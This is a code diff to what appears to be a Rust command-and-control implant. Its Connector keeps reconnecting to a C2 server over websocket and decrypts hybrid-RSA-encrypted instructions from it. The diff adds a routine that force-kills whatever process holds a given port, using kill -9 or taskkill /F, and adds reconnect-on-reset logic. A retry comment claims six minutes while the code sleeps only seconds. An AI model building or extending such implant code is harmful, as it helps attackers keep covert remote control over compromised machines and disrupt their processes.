@@ -10,10 +10,13 @@ use futures_util::{
 };
 use gethostname::gethostname;
 use hybrid_crypto::{encrypt_data_combined, generate_private_key, HybridDecryption};
+use netstat2::AddressFamilyFlags;
+use netstat2::{get_sockets_info, ProtocolFlags, ProtocolSocketInfo};
 use rsa::{
     pkcs1::{DecodeRsaPublicKey, EncodeRsaPublicKey},
     Pkcs1v15Encrypt, RsaPrivateKey, RsaPublicKey,
 };
+use tokio::process::Command;
 use tokio_tungstenite::{
     connect_async,
     tungstenite::{handshake::client::Response, Message},
@@ -52,6 +55,40 @@ impl Connector {
             .await
             .unwrap();
     }
+    pub fn kill_process_on_port(&self, port: u16) {
+        let af_flags = AddressFamilyFlags::IPV4 | AddressFamilyFlags::IPV6;
+        let proto_flags = ProtocolFlags::TCP;
+
+        if let Ok(sockets_info) = get_sockets_info(af_flags, proto_flags) {
+            for si in sockets_info {
+                if let ProtocolSocketInfo::Tcp(tcp_info) = si.protocol_socket_info {
+                    if tcp_info.local_port == port {
+                        println!(
+                            "Found port {} in use by PID {}",
+                            port, si.associated_pids[0]
+                        );
+                        let pid = si.associated_pids[0];
+                        // Kill process (UNIX-style)
+                        #[cfg(unix)]
+                        {
+                            let _ = Command::new("kill").arg("-9").arg(pid.to_string()).status();
+                        }
+                        // Windows version (taskkill)
+                        #[cfg(windows)]
+                        {
+                            let _ = Command::new("taskkill")
+                                .arg("/PID")
+                                .arg(pid.to_string())
+                                .arg("/F")
+                                .status();
+                        }
+                    }
+                }
+            }
+        } else {
+            eprintln!("Failed to retrieve socket info");
+        }
+    }
 
     pub async fn search_for_c2(&mut self) {
         match connect_async(&self.address_server).await {
@@ -73,7 +110,7 @@ impl Connector {
             Err(e) => {
                 eprintln!("Failed to connect: {} the server is probably down", e);
                 //wait for 6 min to try to connect again
-                tokio::time::sleep(Duration::from_secs(6)).await;
+                tokio::time::sleep(Duration::from_secs(5)).await;
                 Box::pin(self.search_for_c2()).await;
             }
         }
@@ -148,8 +185,17 @@ impl Connector {
         for index in 0..3 {
             if let Some(message) = self.read.as_mut().unwrap().next().await {
                 //cant put hex decode in the decrypt fn cuz it cant accept
+                let unwraped_message = match message {
+                    Ok(message) => message,
+                    Err(error) => {
+                        //Reconnect to the server if connection is reset
+                        println!("Lost connection with server: {}", error);
+                        Box::pin(self.search_for_c2()).await;
+                        return vec![];
+                    }
+                };
                 hybrid_decryption_arguments[index] =
-                    hex::decode(message.unwrap().to_string()).unwrap();
+                    hex::decode(unwraped_message.to_string()).unwrap();
             }
         }
         let hybrid_decryption = HybridDecryption::new(
